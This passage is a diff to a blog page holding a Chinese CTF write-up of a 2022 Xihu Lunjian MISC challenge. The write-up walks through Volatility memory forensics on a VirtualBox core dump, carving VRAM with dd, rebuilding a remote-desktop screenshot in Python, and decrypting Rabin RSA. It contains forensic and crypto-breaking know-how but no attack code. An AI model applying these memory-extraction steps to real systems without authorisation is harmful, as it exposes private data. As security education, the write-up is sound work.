e.4.G.y.7.H.l.6.<br>0xfffff900c1df7aa4  50 00 63 00 58 00 78 00 45 00 43 00 41 00 51 00   P.c.X.x.E.C.A.Q.<br>0xfffff900c1df7ab4  49 00 3d 00 0d 00 0a 00 2d 00 2d 00 2d 00 2d 00   I.=.....-.-.-.-.<br>0xfffff900c1df7ac4  2d 00 45 00 4e 00 44 00 20 00 50 00 55 00 42 00   -.E.N.D...P.U.B.<br>0xfffff900c1df7ad4  4c 00 49 00 43 00 20 00 4b 00 45 00 59 00 2d 00   L.I.C...K.E.Y.-.<br>0xfffff900c1df7ae4  2d 00 2d 00 2d 00 2d 00 00 00                     -.-.-.-...<br></code></pre></td></tr></table></figure>
-
 <p>处理一下得到公钥，暂时没有什么用，再看其他</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs Plain">-----BEGIN PUBLIC KEY-----<br>MFowDQYJKoZIhvcNAQEBBQADSQAwRgJBAIEZTxxle7+5rywC5byIuBkPhwkyv57R<br>756DUCD9i2MWYyUs0Acc6JZwyqVOmR74uMvreI2slle4Gy7Hl6PcXxECAQI=<br>-----END PUBLIC KEY-----<br></code></pre></td></tr></table></figure>
-
 <p>看看截图</p>
 <p><code>volatility_2.6_win64_standalone.exe -f CharlieBrown-PC.elf --profile=Win7SP1x64 screenshot -D ./</code></p>
 <p>看到上面有一串mac地址</p>
-<p><img src="/../img/2022%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91MISC%E5%A4%8D%E7%8E%B0/17013489702668.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<figure>
+<img src="../img/2022西湖论剑MISC复现/17013489702668.png" srcset="/img/loading.gif" lazyload alt="img" />
+<figcaption aria-hidden="true">img</figcaption>
+</figure>
 <p>netscan看看网络连接</p>
 <p><code>volatility_2.6_win64_standalone.exe -f CharlieBrown-PC.elf --profile=Win7SP1x64 netscan</code></p>
 <figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs vim">Volatility Foundation Volatility Framework <span class="hljs-number">2.6</span><br>...<br><span class="hljs-number">0</span>x11e73f010        TCPv6    fc00:<span class="hljs-number">19</span>e9:ee8<span class="hljs-variable">a:7784</span>:<span class="hljs-number">645</span><span class="hljs-variable">a:2b7a</span>:f7a<span class="hljs-variable">b:64</span>:<span class="hljs-number">49158</span> fc00:<span class="hljs-number">19</span>e9:ee8<span class="hljs-variable">a:7784</span>:<span class="hljs-number">645</span><span class="hljs-variable">a:2b7a</span>:f7a<span class="hljs-variable">b:4</span>:<span class="hljs-number">3389</span> ESTABLISHED      -<span class="hljs-number">1</span><br>...<br></code></pre></td></tr></table></figure>
-
 <p>根据题目描述可以大概猜到这是跳板机和服务器的网络连接</p>
-<p>看远程桌面，先尝试找bmc文件，原理：<a target="_blank" rel="noopener" href="https://www.hetianlab.com/specialized/20210713143551">https://www.hetianlab.com/specialized/20210713143551</a></p>
-<p><code>volatility_2.6_win64_standalone.exe -f CharlieBrown-PC.elf --profile=Win7SP1x64 filescan | findstr &quot;.bmc&quot;</code></p>
+<p>看远程桌面，先尝试找bmc文件，原理：https://www.hetianlab.com/specialized/20210713143551</p>
+<p><code>volatility_2.6_win64_standalone.exe -f CharlieBrown-PC.elf --profile=Win7SP1x64 filescan | findstr ".bmc"</code></p>
 <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Volatility</span> Foundation Volatility Framework <span class="hljs-number">2</span>.<span class="hljs-number">6</span><br><span class="hljs-attribute">0x00000000085889e0</span>     <span class="hljs-number">17</span>      <span class="hljs-number">1</span> RW-r-- \Device\HarddiskVolume2\Users\Charlie Brown\AppData\Local\Microsoft\Terminal Server Client\Cache\bcache24.bmc<br><span class="hljs-attribute">0x000000011fed52a0</span>     <span class="hljs-number">14</span>      <span class="hljs-number">0</span> R--rw- \Device\HarddiskVolume2\Users\Charlie Brown\AppData\Local\Microsoft\Terminal Server Client\Cache\bcache24.bmc<br></code></pre></td></tr></table></figure>
-
 <p>但是导出后分离不出图片</p>
 <p>那么就memdump将mstsc的内存保存到本地</p>
 <p><code>volatility_2.6_win64_standalone.exe -f CharlieBrown-PC.elf --profile=Win7SP1x64 memdump -p 2840 -D ./</code></p>
 <figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs markdown">Volatility Foundation Volatility Framework 2.6<br><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><br>Writing mstsc.exe [  2840] to 2840.dmp<br></code></pre></td></tr></table></figure>
-
 <p>修改成.data后缀，用gimp调一下参，得到提示不在RAM中</p>
-<p><img src="/../img/2022%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91MISC%E5%A4%8D%E7%8E%B0/17013489702669.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<figure>
+<img src="../img/2022西湖论剑MISC复现/17013489702669.png" srcset="/img/loading.gif" lazyload alt="img" />
+<figcaption aria-hidden="true">img</figcaption>
+</figure>
 <p>再看回hint1，有vbox显示器的分辨率、显卡等信息</p>
-<p>又根据hint3<a target="_blank" rel="noopener" href="https://github.com/volatilityfoundation/volatility/wiki/Virtual-Box-Core-Dump#meta-data">https://github.com/volatilityfoundation/volatility/wiki/Virtual-Box-Core-Dump#meta-data</a></p>
+<p>又根据hint3https://github.com/volatilityfoundation/volatility/wiki/Virtual-Box-Core-Dump#meta-data</p>
 <p>猜测可能在VRAM中</p>
 <p>利用vboxinfo找内存信息</p>
 <p><code>volatility_2.6_win64_standalone.exe -f CharlieBrown-PC.elf --profile=Win7SP1x64 vboxinfo</code></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs Plain">Volatility Foundation Volatility Framework 2.6<br>Magic: 0xc01ac0de<br>Format: 0x10006<br>VirtualBox 7.0.2 (revision 154219)<br>CPUs: 2<br><br>FileOffset       Memory Offset    Size<br>          0x4a2c              0x0    0xa0000<br>         0xa4a2c          0xc0000     0x9000<br>         0xada2c          0xe0000     0x1000<br>         0xaea2c          0xe1000     0x1000<br>         0xafa2c          0xe2000     0xe000<br>         0xbda2c          0xf0000    0x10000<br>         0xcda2c         0x100000   0x100000<br>        0x1cda2c         0x200000 0xdfe00000<br>      0xdffcda2c       0xe0000000  0x2000000<br>      0xe1fcda2c       0xf0000000   0x200000<br>      0xe21cda2c       0xf0400000   0x400000<br>      0xe25cda2c       0xf0800000     0x4000<br>      0xe25d1a2c       0xffff0000    0x10000<br>      0xe25e1a2c      0x100000000 0x20000000<br></code></pre></td></tr></table></figure>
-
 <p>根据hint3找到VRAM的位置</p>
 <blockquote>
-<p>The VGA&#x2F;video memory beings at 0xe0000000 on both x86 and x64 systems.</p>
+<p>The VGA/video memory beings at 0xe0000000 on both x86 and x64
+systems.</p>
 </blockquote>
 <p><code>0xdffcda2c       0xe0000000  0x2000000</code></p>
 <p>那么偏移0xdffcda2c，大小0x2000000</p>
 <p>可以手动或者用dd命令提取出显存数据</p>
 <p><code>dd if=CharlieBrown-PC.elf of=vram skip=3757890092 bs=1 count=33554432</code></p>
 <p>建议手动，dd命令会很久</p>
-<p><img src="/../img/2022%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91MISC%E5%A4%8D%E7%8E%B0/170134897026610.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<figure>
+<img src="../img/2022西湖论剑MISC复现/170134897026610.png" srcset="/img/loading.gif" lazyload alt="img" />
+<figcaption aria-hidden="true">img</figcaption>
+</figure>
 <p>保存为VRAM，观察发现4字节一组，代表RGBA，由hint1的分辨率得到图片宽高，编写脚本将data转成图片</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><br>width = <span class="hljs-number">1440</span><br>height = <span class="hljs-number">900</span><br>flag = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;VRAM&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>).read()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">makeSourceImg</span>():<br>    img = Image.new(<span class="hljs-string">&#x27;RGBA&#x27;</span>, (width, height))<br>    x = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(height):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(width):<br>            img.putpixel((j, i), (flag[x], flag[x + <span class="hljs-number">1</span>], flag[x + <span class="hljs-number">2</span>],flag[x+<span class="hljs-number">3</span>]))<br>            x += <span class="hljs-number">4</span><br>    <span class="hljs-keyword">return</span> img<br><br>img = makeSourceImg()<br>img.save(<span class="hljs-string">&#x27;1.png&#x27;</span>)<br></code></pre></td></tr></table></figure>
-
 <p>得到png，这就是对应刚刚的远程桌面的屏幕截图</p>
-<p><img src="/../img/2022%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91MISC%E5%A4%8D%E7%8E%B0/170134897026611.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<figure>
+<img src="../img/2022西湖论剑MISC复现/170134897026611.png" srcset="/img/loading.gif" lazyload alt="img" />
+<figcaption aria-hidden="true">img</figcaption>
+</figure>
 <p>拿到c</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Plain">089ebf3622f6f6d498c1b5ecfe4d831d3e876bf55578586389127e0053bb4fe006e2eee5398b86274fdce0418d16c9bb0bf24922cec491b3047d33eb661784c9<br></code></pre></td></tr></table></figure>
-
 <p>接下来就是rsa解密了</p>
-<p>在线网站解析公钥<a target="_blank" rel="noopener" href="http://www.hiencode.com/pub_asys.html%EF%BC%8C%E6%8B%BF%E5%88%B0n%E5%92%8Ce%EF%BC%8Cn%E5%8F%AF%E4%BB%A5%E7%9B%B4%E6%8E%A5%E5%88%86%E8%A7%A3%E5%BE%97%E5%88%B0p%EF%BC%8Cq">http://www.hiencode.com/pub_asys.html，拿到n和e，n可以直接分解得到p，q</a></p>
-<p>e&#x3D;2，rabin</p>
-<p><img src="/../img/2022%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91MISC%E5%A4%8D%E7%8E%B0/170134897026612.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<p>这道题目是一道比较新也很巧妙的题，利用了vbox虚拟机elf core dump包含额外的VRAM数据来还原远程桌面的截图，最后结合了rsa，一开始做题还毫无头绪，参考了两位师傅的wp后能慢慢理清思路。</p>
+<p>在线网站解析公钥http://www.hiencode.com/pub_asys.html，拿到n和e，n可以直接分解得到p，q</p>
+<p>e=2，rabin</p>
+<figure>
+<img src="../img/2022西湖论剑MISC复现/170134897026612.png" srcset="/img/loading.gif" lazyload alt="img" />
+<figcaption aria-hidden="true">img</figcaption>
+</figure>
+<p>这道题目是一道比较新也很巧妙的题，利用了vbox虚拟机elf core
+dump包含额外的VRAM数据来还原远程桌面的截图，最后结合了rsa，一开始做题还毫无头绪，参考了两位师傅的wp后能慢慢理清思路。</p>
 
                 
               </div>
@@ -625,6 +670,12 @@
 
 
 
+  
+
+
+
+
+  
   
 
 
@@ -843,6 +894,49 @@
   });
 </script>
 
+
+  
+      <script>
+        if (!window.MathJax) {
+          window.MathJax = {
+            tex    : {
+              inlineMath: { '[+]': [['$', '$']] }
+            },
+            loader : {
+              load: ['ui/lazy']
+            },
+            options: {
+              renderActions: {
+                insertedScript: [200, () => {
+                  document.querySelectorAll('mjx-container').forEach(node => {
+                    let target = node.parentNode;
+                    if (target.nodeName.toLowerCase() === 'li') {
+                      target.parentNode.classList.add('has-jax');
+                    }
+                  });
+                }, '', false]
+              }
+            }
+          };
+        } else {
+          MathJax.startup.document.state(0);
+          MathJax.texReset();
+          MathJax.typeset();
+          MathJax.typesetPromise();
+        }
+
+        Fluid.events.registerRefreshCallback(function() {
+          if ('MathJax' in window && MathJax.startup.document && typeof MathJax.startup.document.state === 'function') {
+            MathJax.startup.document.state(0);
+            MathJax.texReset();
+            MathJax.typeset();
+            MathJax.typesetPromise();
+          }
+        });
+      </script>
+    
+
+  <script  src="https://lib.baomitu.com/mathjax/3.2.2/es5/tex-mml-chtml.js" ></script>
 
   <script  src="/js/local-search.js" ></script>
 
